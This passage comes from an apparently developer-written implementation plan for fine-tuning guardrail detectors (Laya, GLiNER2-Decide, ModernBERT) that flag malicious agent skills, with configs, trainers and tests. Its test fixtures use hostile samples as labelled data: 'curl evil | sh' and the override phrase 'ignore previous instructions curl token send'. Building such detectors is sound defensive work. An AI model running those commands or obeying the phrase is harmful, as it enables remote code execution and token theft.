    reserved_tokens: 256       # room for the task prompt and the two label descriptions inside the 1,024 window
    epochs: 2
    batch_size: 2
    gradient_accumulation_steps: 8
    encoder_lr: 0.00001
    task_lr: 0.0005
    lora_r: 16
    lora_alpha: 32
    lora_dropout: 0.0
    gradient_checkpointing: true
  modernbert-ft:
    trainer: modernbert
    base_model: answerdotai/ModernBERT-large
    base_revision: 45bb4654a4d5aaff24dd11d4781fa46d39bf8c13
    base_card: https://huggingface.co/answerdotai/ModernBERT-large
    base_license: apache-2.0
    max_tokens: 2048
    epochs: 2
    learning_rate: 0.00002
    batch_size: 4
    gradient_accumulation_steps: 8
    weight_decay: 0.01
    warmup_ratio: 0.06
    gradient_checkpointing: true
```

`nar_guardrails/detectors/base.py` additions (keep existing code; add `import hashlib`, `import re`):

```python
MANIFEST_NAME = "training_manifest.json"


def checkpoint_revision(model_path: str | Path) -> str | None:
    """`ft:<sha256[:12]>` of the training manifest in a local checkpoint dir or its parent; None otherwise."""
    p = Path(model_path)
    for d in (p, p.parent):
        f = d / MANIFEST_NAME
        if f.is_file():
            return "ft:" + hashlib.sha256(f.read_bytes()).hexdigest()[:12]
    return None


def require_local_checkpoint(cfg: dict) -> Path:
    """A `finetuned: true` detector points at a local dir; a missing one is DetectorUnavailable (skipped), not a crash."""
    path = Path(cfg["model_id"])
    if path.is_dir():
        return path
    m = re.fullmatch(r"models/([^/]+)/seed(\d+)/model", str(cfg["model_id"]))
    hint = f"; train it with `nar train --model {m.group(1)} --seed {m.group(2)}`" if m else ""
    raise DetectorUnavailable(f"fine-tuned checkpoint not found at {cfg['model_id']}{hint}")
```

Adapters — first statement of each `__init__` after `super().__init__(cfg, policy)`:

```python
        if cfg.get("finetuned"):
            require_local_checkpoint(cfg)
```

and the revision lines become:

- laya: `self.agent = laya.load(cfg["model_id"], device=pick_device(cfg.get("device", "auto")), revision=cfg.get("revision"))` and `self.revision = getattr(self.agent, "revision", None) or hf_revision(cfg["model_id"], cfg.get("revision")) or checkpoint_revision(cfg["model_id"])`
- gliner2: `self.revision = hf_revision(cfg["model_id"], cfg.get("revision")) or checkpoint_revision(cfg["model_id"])`
- hf_classifier: `self.revision = hf_revision(cfg["model_id"], cfg.get("revision"), self.model.config) or checkpoint_revision(cfg["model_id"])`

`nar_guardrails/train/manifest.py`:

```python
"""Training manifests: what was trained, on what, with which settings. Model cards are rendered from them."""
from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path

from nar_guardrails.detectors.base import MANIFEST_NAME, checkpoint_revision  # noqa: F401  (re-exported)


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def write_training_manifest(seed_dir: Path, manifest: dict) -> Path:
    seed_dir = Path(seed_dir)
    seed_dir.mkdir(parents=True, exist_ok=True)
    path = seed_dir / MANIFEST_NAME
    path.write_text(json.dumps(manifest, indent=2, default=str, sort_keys=True), encoding="utf-8")
    return path


def read_training_manifest(seed_dir: Path) -> dict:
    return json.loads((Path(seed_dir) / MANIFEST_NAME).read_text(encoding="utf-8"))
```

`configs/models.yaml` — append under `detectors:` (before the `claude-*` entries is fine):

```yaml
  # Fine-tuned checkpoints (spec §9). Absent until `nar train` has run; the runner skips them with a reason.
  laya-ft-seed0: {adapter: laya, finetuned: true, model_id: models/laya-ft/seed0/model, device: auto, batch_size: 8, tracks: [skills]}
  laya-ft-seed1: {adapter: laya, finetuned: true, model_id: models/laya-ft/seed1/model, device: auto, batch_size: 8, tracks: [skills]}
  laya-ft-seed2: {adapter: laya, finetuned: true, model_id: models/laya-ft/seed2/model, device: auto, batch_size: 8, tracks: [skills]}
  gliner2-decide-ft-seed0: {adapter: gliner2, mode: decide, finetuned: true, model_id: models/gliner2-decide-ft/seed0/model, device: auto, batch_size: 4, tracks: [skills]}
  gliner2-decide-ft-seed1: {adapter: gliner2, mode: decide, finetuned: true, model_id: models/gliner2-decide-ft/seed1/model, device: auto, batch_size: 4, tracks: [skills]}
  gliner2-decide-ft-seed2: {adapter: gliner2, mode: decide, finetuned: true, model_id: models/gliner2-decide-ft/seed2/model, device: auto, batch_size: 4, tracks: [skills]}
  modernbert-ft-seed0: {adapter: hf_classifier, finetuned: true, model_id: models/modernbert-ft/seed0/model, positive_label: malicious, max_length: 2048, device: auto, batch_size: 4, tracks: [skills]}
  modernbert-ft-seed1: {adapter: hf_classifier, finetuned: true, model_id: models/modernbert-ft/seed1/model, positive_label: malicious, max_length: 2048, device: auto, batch_size: 4, tracks: [skills]}
  modernbert-ft-seed2: {adapter: hf_classifier, finetuned: true, model_id: models/modernbert-ft/seed2/model, positive_label: malicious, max_length: 2048, device: auto, batch_size: 4, tracks: [skills]}
```

- [ ] **Step 4: Run the whole suite**

Run: `uv run pytest -q`
Expected: all pass. Also run `uv run nar smoke --detectors laya-ft-seed0 --n 2` and confirm the row is `skipped` with the `nar train` hint (no traceback).

- [ ] **Step 5: Commit**

```bash
git add configs/finetune.yaml configs/models.yaml nar_guardrails/train/manifest.py nar_guardrails/detectors/base.py nar_guardrails/detectors/laya_adapter.py nar_guardrails/detectors/gliner2_adapter.py nar_guardrails/detectors/hf_classifier.py tests/test_train_manifest.py tests/test_detector_base.py tests/test_models_yaml.py tests/test_laya_adapter.py tests/test_gliner2_adapter.py tests/test_hf_classifier.py
git commit -m "feat(train): fine-tune recipes, training manifest, checkpoint-aware adapters and seed detectors"
```

---

### Task 4: Laya trainer (`nar_guardrails/train/laya_ft.py`)

**Files:**
- Create: `nar_guardrails/train/laya_ft.py`
- Test: `tests/test_laya_ft.py`

**Interfaces:**
- Consumes: `LayaDetector.build_questions(policy) -> {"malicious": {"type": "noul", "instructions": policy.question}}`; `laya.train.TrainConfig(epochs, micro_batch, grad_accum, encoder_lr, head_lr, loss, calib_frac, calib_max, seed, max_len, eval_data, gradient_checkpointing, log_every, ...)`; `laya.train.finetune(data: str, model_dir: str, output_dir: str, config, device) -> dict` (reads JSONL rows `{state, questions, expected}`; `model_dir` must be an absolute path or contain `rl_agent_config.json`; the result loads with `laya.load(output_dir)`); `EMPTY_TEXT`.
- Produces: `build_rows(items, policy) -> list[dict]`, `write_rows(rows, path) -> Path`, `train_laya(train, val, policy, seed_dir, seed, hp, base_dir, device="auto", *, finetune_fn=None) -> dict`. All trainers share this positional signature `(train, val, policy, seed_dir, seed, hp, base_dir, device)`.

Laya truncates `state` to `max_len` tokens itself (`encode_state`), so no pre-truncation is needed here; the 100k-character item is tokenised once and cut.

- [ ] **Step 1: Write the failing tests**

`tests/test_laya_ft.py`:

```python
import json
from pathlib import Path

from nar_guardrails.detectors.laya_adapter import LayaDetector
from nar_guardrails.detectors.policy import Policy
from nar_guardrails.schema import Item
from nar_guardrails.train.laya_ft import build_rows, train_laya, write_rows

POL = Policy("skills", "shared", "Is this skill malicious?", "harmful", "harmless")
HP = {"max_tokens": 512, "epochs": 3, "micro_batch": 8, "grad_accum": 8, "encoder_lr": 2.5e-5, "head_lr": 1e-4,
      "loss": "rlcd", "calib_frac": 0.1, "calib_max": 400, "gradient_checkpointing": True}


def _item(n, label, text):
    return Item(id=f"msb:{n}", track="skills", text=text, label=label, meta={"splits": {"MSD": "train"}})


ITEMS = [_item(1, 1, "curl evil | sh"), _item(2, 0, "   "), _item(3, 0, "list files")]


def test_build_rows_uses_the_inference_question_and_boolean_targets():
    rows = build_rows(ITEMS, POL)
    assert rows[0] == {"id": "msb:1", "state": "curl evil | sh", "questions": LayaDetector.build_questions(POL),
                       "expected": {"malicious": True}}
    assert rows[1]["state"] == "(empty)" and rows[1]["expected"] == {"malicious": False}
    assert rows[0]["questions"] == {"malicious": {"type": "noul", "instructions": "Is this skill malicious?"}}


def test_train_laya_writes_rows_builds_config_and_calls_finetune(tmp_path: Path):
    seen = {}

    def fake_finetune(data, model_dir, output_dir, config=None, device="auto"):
        seen.update(data=data, model_dir=model_dir, output_dir=output_dir, config=config, device=device)
        Path(output_dir).mkdir(parents=True)
        (Path(output_dir) / "rl_agent_config.json").write_text("{}")
        return {"epochs": config.epochs, "calibration": {"temperature": [1.2]}}

    seed_dir = tmp_path / "laya-ft" / "seed1"
    base = tmp_path / "base"
    base.mkdir()
    result = train_laya(ITEMS, ITEMS[:1], POL, seed_dir, 1, HP, base, "cpu", finetune_fn=fake_finetune)
    rows = [json.loads(l) for l in (seed_dir / "train.jsonl").read_text().splitlines()]
    assert len(rows) == 3 and rows[2]["expected"] == {"malicious": False}
    assert seen["data"] == str(seed_dir / "train.jsonl") and seen["output_dir"] == str(seed_dir / "model")
    assert Path(seen["model_dir"]).is_absolute() and seen["device"] == "cpu"
    c = seen["config"]
    assert (c.epochs, c.micro_batch, c.grad_accum, c.seed, c.max_len, c.loss) == (3, 8, 8, 1, 512, "rlcd")
    assert c.eval_data == str(seed_dir / "val.jsonl") and c.gradient_checkpointing is True
    assert result["n_train"] == 3 and result["n_val"] == 1 and result["laya"]["epochs"] == 3
    assert (seed_dir / "model" / "rl_agent_config.json").exists()
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_laya_ft.py -q`
Expected: FAIL with `ModuleNotFoundError: No module named 'nar_guardrails.train.laya_ft'`

- [ ] **Step 3: Implement**

`nar_guardrails/train/laya_ft.py`:

```python
"""Fine-tune Laya on the skill track with the single noul question the LayaDetector asks at inference."""
from __future__ import annotations

import json
from pathlib import Path

from nar_guardrails.detectors.laya_adapter import LayaDetector
from nar_guardrails.detectors.policy import Policy
from nar_guardrails.schema import Item
from nar_guardrails.train.data import EMPTY_TEXT


def build_rows(items: list[Item], policy: Policy) -> list[dict]:
    """`{state, questions, expected}` rows for laya.train.finetune; the question is the detector's own."""
    questions = LayaDetector.build_questions(policy)
    return [{"id": i.id, "state": i.text if i.text.strip() else EMPTY_TEXT, "questions": questions,
             "expected": {"malicious": bool(i.label)}} for i in items]


def write_rows(rows: list[dict], path: Path) -> Path:
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    return path


def train_laya(train: list[Item], val: list[Item], policy: Policy, seed_dir: Path, seed: int, hp: dict,
               base_dir: Path, device: str = "auto", *, finetune_fn=None) -> dict:
    from laya.train import TrainConfig, finetune

    finetune_fn = finetune_fn or finetune
    seed_dir = Path(seed_dir)
    data = write_rows(build_rows(train, policy), seed_dir / "train.jsonl")
    eval_path = write_rows(build_rows(val, policy), seed_dir / "val.jsonl")
    config = TrainConfig(epochs=int(hp["epochs"]), micro_batch=int(hp["micro_batch"]), grad_accum=int(hp["grad_accum"]),
                         encoder_lr=float(hp["encoder_lr"]), head_lr=float(hp["head_lr"]), loss=hp["loss"],
                         calib_frac=float(hp["calib_frac"]), calib_max=int(hp["calib_max"]), seed=seed,
                         max_len=int(hp["max_tokens"]), eval_data=str(eval_path),
                         gradient_checkpointing=bool(hp.get("gradient_checkpointing", False)), log_every=20)
    # laya resolves bare relative dirs as Hub ids unless they contain rl_agent_config.json; absolute is unambiguous
    summary = finetune_fn(str(data), str(Path(base_dir).resolve()), str(seed_dir / "model"), config=config, device=device)
    return {"n_train": len(train), "n_val": len(val), "laya": summary}
```

- [ ] **Step 4: Run the tests**

Run: `uv run pytest tests/test_laya_ft.py -q`
Expected: 2 passed

- [ ] **Step 5: Commit**

```bash
git add nar_guardrails/train/laya_ft.py tests/test_laya_ft.py
git commit -m "feat(train): Laya trainer over laya.train.finetune with the detector's noul question"
```

---

### Task 5: GLiNER2.5-Decide trainer (`nar_guardrails/train/gliner2_ft.py`)

**Files:**
- Create: `nar_guardrails/train/gliner2_ft.py`
- Test: `tests/test_gliner2_ft.py`

**Interfaces:**
- Consumes: `GLiNER2Detector.build_schema("decide", policy) -> ({"input_safety": {"malicious": policy.malicious, "benign": policy.benign}}, "input_safety", "malicious")`; `gliner2.training.data.create_classification_example(text, task, labels, true_label, multi_label=False, **kwargs)` where `label_descriptions: dict[str, str]` is a `Classification` field; `gliner2.training.trainer.TrainingConfig` (fields used below exist in 2.1.0), `ExtractorTrainer(model, config).train(train_data=..., eval_data=...) -> dict` (saves `<output_dir>/final/`; with `use_lora=True, save_adapter_only=False` the final save is a merged full model that `GLiNER2.from_pretrained(dir)` loads); the trainer picks only cuda/cpu in `_setup_device`, so MPS is set after construction; `truncate_tokens`, `pick_device`.
- Produces: `build_examples(items, policy, tok, max_tokens) -> list[InputExample]`, `train_gliner2_decide(train, val, policy, seed_dir, seed, hp, base_dir, device="auto", *, tokenizer=None, load_model=None, trainer_cls=None, keep_trainer_dir=False) -> dict`.

- [ ] **Step 1: Write the failing tests**

`tests/test_gliner2_ft.py`:

```python
from pathlib import Path

from nar_guardrails.detectors.policy import Policy
from nar_guardrails.schema import Item
from nar_guardrails.train.gliner2_ft import build_examples, train_gliner2_decide

POL = Policy("skills", "shared", "q", "does harm", "does no harm")
HP = {"max_tokens": 1024, "reserved_tokens": 256, "epochs": 2, "batch_size": 2, "gradient_accumulation_steps": 8,
      "encoder_lr": 1e-5, "task_lr": 5e-4, "lora_r": 16, "lora_alpha": 32, "lora_dropout": 0.0,
      "gradient_checkpointing": True}


class WordTok:
    def encode(self, text, add_special_tokens=False):
        return text.split()

    def decode(self, ids):
        return " ".join(ids)


def _item(n, label, text):
    return Item(id=f"msb:{n}", track="skills", text=text, label=label, meta={"splits": {"MSD": "train"}})


ITEMS = [_item(1, 1, " ".join(["w"] * 900)), _item(2, 0, ""), _item(3, 0, "list files")]


def test_build_examples_match_inference_schema_and_truncate():
    ex = build_examples(ITEMS, POL, WordTok(), HP["max_tokens"] - HP["reserved_tokens"])
    c = ex[0].classifications[0]
    assert c.task == "input_safety" and c.labels == ["malicious", "benign"] and c.true_label == "malicious"
    assert c.label_descriptions == {"malicious": "does harm", "benign": "does no harm"} and c.multi_label is False
    assert len(ex[0].text.split()) == 768
    assert ex[1].text == "(empty)" and ex[1].classifications[0].true_label == "benign"


class FakeTrainer:
    calls = []

    def __init__(self, model, config):
        self.model, self.config, self.device = model, config, "cpu"
        FakeTrainer.calls.append(self)

    def train(self, train_data=None, eval_data=None):
        self.train_data, self.eval_data = train_data, eval_data
        final = Path(self.config.output_dir) / "final"
        final.mkdir(parents=True)
        (final / "config.json").write_text("{}")
        return {"total_steps": 4, "best_metric": 0.1, "train_metrics_history": [1], "eval_metrics_history": [2]}


class FakeModel:
    def to(self, device):
        return self


def test_train_gliner2_decide_configures_lora_and_copies_final_checkpoint(tmp_path: Path):
    seed_dir = tmp_path / "gliner2-decide-ft" / "seed2"
    out = train_gliner2_decide(ITEMS, ITEMS[:1], POL, seed_dir, 2, HP, tmp_path / "base", "cpu",
                               tokenizer=WordTok(), load_model=lambda: FakeModel(), trainer_cls=FakeTrainer)
    t = FakeTrainer.calls[-1]
    c = t.config
    assert c.output_dir == str(seed_dir / "trainer") and c.num_epochs == 2 and c.batch_size == 2
    assert c.gradient_accumulation_steps == 8 and c.seed == 2 and c.max_len == 1024
    assert c.use_lora is True and c.lora_r == 16 and c.lora_alpha == 32 and c.save_adapter_only is False
    assert c.eval_strategy == "epoch" and c.num_workers == 0 and c.fp16 is False and c.bf16 is False
    assert c.on_capacity_exceeded == "truncate_with_warning" and c.gradient_checkpointing is True
    assert len(t.train_data) == 3 and len(t.eval_data) == 1
    assert (seed_dir / "model" / "config.json").exists() and not (seed_dir / "trainer").exists()
    assert out["n_train"] == 3 and out["trainer"]["total_steps"] == 4 and "train_metrics_history" not in out["trainer"]
    assert out["device"] == "cpu"
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_gliner2_ft.py -q`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement**

`nar_guardrails/train/gliner2_ft.py`:

```python
"""Fine-tune GLiNER2.5-Decide (LoRA) on the two-label classification schema the GLiNER2Detector uses at inference."""
from __future__ import annotations

import shutil
from pathlib import Path

from nar_guardrails.detectors.gliner2_adapter import GLiNER2Detector
from nar_guardrails.detectors.policy import Policy
from nar_guardrails.device import pick_device
from nar_guardrails.schema import Item
from nar_guardrails.train.data import truncate_tokens


def build_examples(items: list[Item], policy: Policy, tok, max_tokens: int) -> list:
    """One classification InputExample per item; task name, labels and descriptions are the detector's own."""
    from gliner2.training.data import create_classification_example

    schema, task, positive = GLiNER2Detector.build_schema("decide", policy)
    descriptions = dict(schema[task])
    labels = list(descriptions)
    return [create_classification_example(truncate_tokens(tok, i.text, max_tokens), task, labels,
                                          positive if i.label == 1 else "benign", multi_label=False,
                                          label_descriptions=descriptions) for i in items]


def train_gliner2_decide(train: list[Item], val: list[Item], policy: Policy, seed_dir: Path, seed: int, hp: dict,
                         base_dir: Path, device: str = "auto", *, tokenizer=None, load_model=None, trainer_cls=None,
                         keep_trainer_dir: bool = False) -> dict:
    import torch
    from gliner2.training.trainer import ExtractorTrainer, TrainingConfig

    seed_dir = Path(seed_dir)
    if tokenizer is None:
        from transformers import AutoTokenizer

        tokenizer = AutoTokenizer.from_pretrained(str(base_dir))  # the snapshot ships tokenizer.json
    budget = int(hp["max_tokens"]) - int(hp.get("reserved_tokens", 0))
    ex_train = build_examples(train, policy, tokenizer, budget)
    ex_val = build_examples(val, policy, tokenizer, budget)
    if load_model is None:
        from gliner2 import GLiNER2

        model = GLiNER2.from_pretrained(str(base_dir))
    else:
        model = load_model()
    trainer_dir = seed_dir / "trainer"
    config = TrainingConfig(
        output_dir=str(trainer_dir), experiment_name="gliner2-decide-ft", num_epochs=int(hp["epochs"]),
        batch_size=int(hp["batch_size"]), eval_batch_size=int(hp["batch_size"]),
        gradient_accumulation_steps=int(hp["gradient_accumulation_steps"]),
        encoder_lr=float(hp["encoder_lr"]), task_lr=float(hp["task_lr"]),
        eval_strategy="epoch", save_total_limit=1, save_best=False, logging_steps=20,
        seed=seed, deterministic=True, num_workers=0, pin_memory=False,
        max_len=int(hp["max_tokens"]), on_capacity_exceeded="truncate_with_warning",
        use_lora=True, lora_r=int(hp["lora_r"]), lora_alpha=float(hp["lora_alpha"]),
        lora_dropout=float(hp["lora_dropout"]), save_adapter_only=False,
        gradient_checkpointing=bool(hp.get("gradient_checkpointing", False)),
        fp16=False, bf16=False, report_to_wandb=False, compile_model=False,
    )
    trainer = (trainer_cls or ExtractorTrainer)(model=model, config=config)
    dev = pick_device(device)
    if dev != "cpu":  # the trainer's _setup_device only knows cuda/cpu; move to MPS after construction
        trainer.device = torch.device(dev)
        trainer.model.to(trainer.device)
    result = trainer.train(train_data=ex_train, eval_data=ex_val)
    model_dir = seed_dir / "model"
    if model_dir.exists():
        shutil.rmtree(model_dir)
    shutil.copytree(trainer_dir / "final", model_dir)
    if not keep_trainer_dir:
        shutil.rmtree(trainer_dir)  # epoch checkpoints are full-size copies; the manifest keeps the metrics
    summary = {k: v for k, v in result.items() if k not in ("train_metrics_history", "eval_metrics_history")}
    return {"n_train": len(ex_train), "n_val": len(ex_val), "device": dev, "trainer": summary}
```

- [ ] **Step 4: Run the tests**

Run: `uv run pytest tests/test_gliner2_ft.py -q`
Expected: 2 passed

- [ ] **Step 5: Commit**

```bash
git add nar_guardrails/train/gliner2_ft.py tests/test_gliner2_ft.py
git commit -m "feat(train): GLiNER2.5-Decide LoRA trainer on the detector's classification schema"
```

---

### Task 6: ModernBERT-large trainer (`nar_guardrails/train/modernbert_ft.py`)

**Files:**
- Create: `nar_guardrails/train/modernbert_ft.py`
- Test: `tests/test_modernbert_ft.py`

**Interfaces:**
- Consumes: `transformers.Trainer`, `TrainingArguments` (5.20 names: `eval_strategy`, `save_strategy`, `use_cpu`, `report_to`), `AutoModelForSequenceClassification`, `AutoTokenizer`, `DataCollatorWithPadding`, `set_seed`; `nar_guardrails.bench.metrics.basic_metrics(y, scores, threshold) -> dict` and `auroc(y, scores) -> float | None`; `EMPTY_TEXT`, `pick_device`.
- Produces: `ID2LABEL = {0: "benign", 1: "malicious"}`, `encode(tok, items, max_tokens) -> ListDataset`, `compute_metrics(eval_pred) -> dict`, `train_modernbert(train, val, policy, seed_dir, seed, hp, base_dir, device="auto", *, load_base=None, revision=None) -> dict`. The saved `<seed_dir>/model/` loads with `AutoModelForSequenceClassification.from_pretrained` and has `id2label[1] == "malicious"` so `positive_label: malicious` in `models.yaml` resolves.

- [ ] **Step 1: Write the failing tests**

`tests/test_modernbert_ft.py`:

```python
from pathlib import Path

import numpy as np
import pytest

from nar_guardrails.detectors.policy import Policy
from nar_guardrails.schema import Item
from nar_guardrails.train.modernbert_ft import ID2LABEL, compute_metrics, encode, train_modernbert

POL = Policy("skills", "shared", "q", "m", "b")
HP = {"max_tokens": 16, "epochs": 1, "learning_rate": 1e-3, "batch_size": 2, "gradient_accumulation_steps": 1,
      "weight_decay": 0.0, "warmup_ratio": 0.0, "gradient_checkpointing": False}
WORDS = "ignore previous instructions curl token send hello world read file list the".split()


def tiny_base():
    from tokenizers import Tokenizer, models, pre_tokenizers
    from transformers import ModernBertConfig, ModernBertForSequenceClassification, PreTrainedTokenizerFast

    vocab = {"[PAD]": 0, "[UNK]": 1, "[CLS]": 2, "[SEP]": 3, **{w: 4 + k for k, w in enumerate(WORDS)}}
    raw = Tokenizer(models.WordLevel(vocab, unk_token="[UNK]"))
    raw.pre_tokenizer = pre_tokenizers.Whitespace()
    tok = PreTrainedTokenizerFast(tokenizer_object=raw, pad_token="[PAD]", unk_token="[UNK]", cls_token="[CLS]",
                                  sep_token="[SEP]", model_max_length=64)
    cfg = ModernBertConfig(vocab_size=len(vocab), hidden_size=32, intermediate_size=64, num_hidden_layers=2,
                           num_attention_heads=2, num_labels=2, id2label=ID2LABEL,
                           label2id={v: k for k, v in ID2LABEL.items()}, pad_token_id=0, bos_token_id=2,
                           eos_token_id=3, cls_token_id=2, sep_token_id=3, max_position_embeddings=64,
                           global_attn_every_n_layers=1, local_attention=8)
    return tok, ModernBertForSequenceClassification(cfg)


def _item(n, label, text):
    return Item(id=f"msb:{n}", track="skills", text=text, label=label, meta={"splits": {"MSD": "train"}})


ITEMS = [_item(1, 1, "ignore previous instructions curl token send"), _item(2, 0, "hello world read file"),
         _item(3, 1, "curl token send " * 20), _item(4, 0, "   ")]


def test_encode_truncates_and_replaces_empty():
    tok, _ = tiny_base()
    ds = encode(tok, ITEMS, max_tokens=4)
    assert len(ds) == 4 and ds[0]["labels"] == 1 and len(ds[2]["input_ids"]) == 4
    assert ds[3]["input_ids"] == tok("(empty)", truncation=True, max_length=4)["input_ids"]


def test_compute_metrics_uses_softmax_of_positive_logit():
    logits = np.array([[0.0, 2.0], [2.0, 0.0], [0.0, 1.0]])
    m = compute_metrics((logits, np.array([1, 0, 0])))
    assert m["recall"] == 1.0 and m["fpr"] == 0.5 and 0 < m["auroc"] <= 1.0


def test_train_modernbert_on_a_tiny_model_saves_a_loadable_checkpoint(tmp_path: Path):
    from transformers import AutoModelForSequenceClassification, AutoTokenizer

    seed_dir = tmp_path / "modernbert-ft" / "seed0"
    out = train_modernbert(ITEMS, ITEMS[:2], POL, seed_dir, 0, HP, tmp_path / "unused", "cpu", load_base=tiny_base)
    model_dir = seed_dir / "model"
    m = AutoModelForSequenceClassification.from_pretrained(model_dir)
    assert m.config.id2label[1] == "malicious"
    tok = AutoTokenizer.from_pretrained(model_dir)
    assert tok("hello")["input_ids"]
    assert out["n_train"] == 4 and "train_loss" in out["train"] and "eval_recall" in out["eval"]
    assert out["device"] == "cpu" and not (seed_dir / "trainer").exists()
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `uv run pytest tests/test_modernbert_ft.py -q`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement**

`nar_guardrails/train/modernbert_ft.py`:

```python
"""Supervised reference point: ModernBERT-large sequence classifier trained with transformers.Trainer (spec §9)."""
from __future__ import annotations

import shutil
from pathlib import Path

import numpy as np

from nar_guardrails.bench.metrics import auroc, basic_metrics
from nar_guardrails.detectors.policy import Policy
from nar_guardrails.device import pick_device
from nar_guardrails.schema import Item
from nar_guardrails.train.data import EMPTY_TEXT

ID2LABEL = {0: "benign", 1: "malicious"}
LABEL2ID = {v: k for k, v in ID2LABEL.items()}


class ListDataset:
    """The minimal map-style dataset Trainer needs (len + getitem) over pre-tokenised rows."""

    def __init__(self, rows: list[dict]):
        self.rows = rows

    def __len__(self) -> int:
        return len(self.rows)

    def __getitem__(self, i: int) -> dict:
        return self.rows[i]


def encode(tok, items: list[Item], max_tokens: int) -> ListDataset:
    texts = [i.text if i.text.strip() else EMPTY_TEXT for i in items]
    enc = tok(texts, truncation=True, max_length=max_tokens)
    return ListDataset([{"input_ids": enc["input_ids"][k], "attention_mask": enc["attention_mask"][k],
                         "labels": int(items[k].label)} for k in range(len(items))])


def compute_metrics(eval_pred) -> dict:
    logits, labels = eval_pred
    logits = np.asarray(logits, dtype=np.float64)
    z = logits - logits.max(axis=-1, keepdims=True)
    probs = np.exp(z) / np.exp(z).sum(axis=-1, keepdims=True)
    y = [int(v) for v in np.asarray(labels)]
    s = [float(v) for v in probs[:, 1]]
    m = basic_metrics(y, s, 0.5)
    return {"recall": m["recall"], "fpr": m["fpr"], "f1": m["f1"], "auroc": auroc(y, s)}


def train_modernbert(train: list[Item], val: list[Item], policy: Policy, seed_dir: Path, seed: int, hp: dict,
                     base_dir: Path, device: str = "auto", *, load_base=None, revision: str | None = None) -> dict:
    from transformers import (AutoModelForSequenceClassification, AutoTokenizer, DataCollatorWithPadding, Trainer,
                              TrainingArguments, set_seed)

    set_seed(seed)
    seed_dir = Path(seed_dir)
    if load_base is None:
        tok = AutoTokenizer.from_pretrained(str(base_dir), revision=revision)
        model = AutoModelForSequenceClassification.from_pretrained(
            str(base_dir), revision=revision, num_labels=2, id2label=ID2LABEL, label2id=LABEL2ID)
    else:
        tok, model = load_base()
    ds_train = encode(tok, train, int(hp["max_tokens"]))
    ds_val = encode(tok, val, int(hp["max_tokens"]))
    dev = pick_device(device)
    trainer_dir = seed_dir / "trainer"
    args = TrainingArguments(
        output_dir=str(trainer_dir), learning_rate=float(hp["learning_rate"]), num_train_epochs=float(hp["epochs"]),
        per_device_train_batch_size=int(hp["batch_size"]), per_device_eval_batch_size=int(hp["batch_size"]),
        gradient_accumulation_steps=int(hp["gradient_accumulation_steps"]), weight_decay=float(hp["weight_decay"]),
        warmup_ratio=float(hp["warmup_ratio"]), eval_strategy="epoch", save_strategy="epoch", save_total_limit=1,
        load_best_model_at_end=True, metric_for_best_model="eval_loss", greater_is_better=False,
        seed=seed, data_seed=seed, report_to="none", logging_steps=20, use_cpu=(dev == "cpu"),
        fp16=False, bf16=False, dataloader_num_workers=0,
        gradient_checkpointing=bool(hp.get("gradient_checkpointing", False)),
    )
    trainer = Trainer(model=model, args=args, train_dataset=ds_train, eval_dataset=ds_val,
                      data_collator=DataCollatorWithPadding(tok), compute_metrics=compute_metrics)
    train_out = trainer.train()
    eval_out = trainer.evaluate()
    model_dir = seed_dir / "model"
    if model_dir.exists():
        shutil.rmtree(model_dir)
    trainer.save_model(str(model_dir))
    tok.save_pretrained(str(model_dir))
    log_history = list(trainer.state.log_history)
    shutil.rmtree(trainer_dir, ignore_errors=True)
    return {"n_train": len(ds_train), "n_val": len(ds_val), "device": dev, "train": dict(train_out.metrics),
            "eval": dict(eval_out), "log_history": log_history}
```

If the tiny-config test trips on a ModernBERT constraint (for example `local_attention` versus `max_position_embeddings`), adjust the test's config values, not the trainer; record what changed in the report.

- [ ] **Step 4: Run the tests**

Run: `uv run pytest tests/test_modernbert_ft.py -q`
Expected: 3 passed (the tiny training run takes a few seconds on CPU; output must be free of warnings other than transformers' standard "Some weights ... newly initialized" line, which the test model does not emit because it is built from a config)

- [ ] **Step 5: Commit**

```bash
git add nar_guardrails/train/modernbert_ft.py tests/test_modernbert_ft.py
git commit -m "feat(train): ModernBERT-large sequence-classification trainer (supervised reference)"
```

---

### Task 7: `nar train` orchestration, Makefile targets and model-card folder

**Files:**
- Create: `nar_guardrails/train/run.py`
- Create: `docs/model-cards/README.md`
- Modify: `nar_guardrails/cli.py` (add `train` subcommand)
- Modify: `Makefile` (`finetune-probe`, `finetune`, `bench-ft`, `publish-results`)
- Test: `tests/test_train_run.py`, `tests/test_cli.py`

**Interfaces:**
- Consumes: Tasks 1, 3–6 (`select_split`, `assert_disjoint`, `limit_items`, `training_set_record`, `write_training_manifest`, `now_iso`, the three trainers with signature `(train, val, policy, seed_dir, seed, hp, base_dir, device)`), `nar_guardrails.detectors.policy.load_policy(track, name)`, `nar_guardrails.bench.manifest.collect_environment()` and `file_sha256`, `nar_guardrails.schema.read_items`, `huggingface_hub.snapshot_download(model_id, revision=...)`, `huggingface_hub.dataset_info(repo).sha`.
- Produces: `TrainRequest` dataclass, `load_finetune_cfg(path) -> dict`, `resolve_base_dir(model_id, revision) -> Path`, `benchmark_record(data_dir) -> dict`, `write_training_set_file(docs_dir, record) -> Path` (file `docs/model-cards/training-set-<protocol>-<split>.json`), `train(req, trainers=None, resolve_base=resolve_base_dir) -> Path` (returns the manifest path), CLI `nar train --model KEY --seed N [--limit N] [--epochs E] [--max-tokens T] [--device D] [--config P] [--models-dir P] [--data-dir P] [--docs-dir P]`.

Manifest schema written by `train` (consumed by Task 8):

```
key, seed, trainer, limit, checkpoint ("models/<key>/seed<N>/model"),
base: {model_id, revision, card, license, local_dir},
hyperparameters: {<hp minus base_* and trainer>},
policy: {name, hash, question, malicious, benign},
training_set: {<training_set_record minus ids> + ids_file},
validation_set: {<training_set_record minus ids>},
result: <trainer return dict>, environment: collect_environment(), device, weights_license, started, finished
```

- [ ] **Step 1: Write the failing tests**

`tests/test_train_run.py`:

```python
import json
from pathlib import Path

import pytest

from nar_guardrails.schema import Item, write_jsonl
from nar_guardrails.train.run import TrainRequest, train, write_training_set_file

